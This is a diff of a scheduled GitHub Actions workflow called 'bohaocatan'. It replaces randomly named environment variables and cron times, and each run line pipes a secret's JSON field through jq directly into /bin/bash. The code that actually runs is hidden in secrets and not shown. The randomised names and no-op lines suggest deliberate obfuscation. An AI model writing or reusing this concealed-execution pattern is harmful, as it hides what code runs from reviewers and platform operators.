@@ -3,25 +3,19 @@ name: bohaocatan
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 5/6 * * *'
-jobs:  # 31079
+    - cron: '2 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: bohaocatan
         env:
-          vsili2722: ${{ secrets.vsili2722 }}
+          wva46: ${{ secrets.wva46 }}
         run: |
-          echo $vsili2722 | jq -r .xvi7041 | /bin/bash
-          echo $l7149 | jq -r .midhq1 | /bin/bash
-          echo $ztxlb174 | jq -r .xvy32 | /bin/bash
-          echo $h35428 | jq -r .mj015 | /bin/bash
-          echo $bm180 | jq -r .vqf8737 | /bin/bash
-          echo $bb347 | jq -r .kuhjc6012 | /bin/bash
-          echo $e58 | jq -r .hn2604 | /bin/bash
-          echo $tla11972 | jq -r .itv60 | /bin/bash
-          echo $wt85203 | jq -r .ngug2525 | /bin/bash
-          echo $hgvz380 | jq -r .i40 | /bin/bash
+          echo $wva46 | jq -r .pmwg407 | /bin/bash
+          echo $zwv89358 | jq -r .hpedv3 | /bin/bash
+          echo $jj6006 | jq -r .vic50 | /bin/bash
+          echo $xxm60402 | jq -r .ypg69 | /bin/bash
+          echo $hw5894 | jq -r .xr01163 | /bin/bash
 
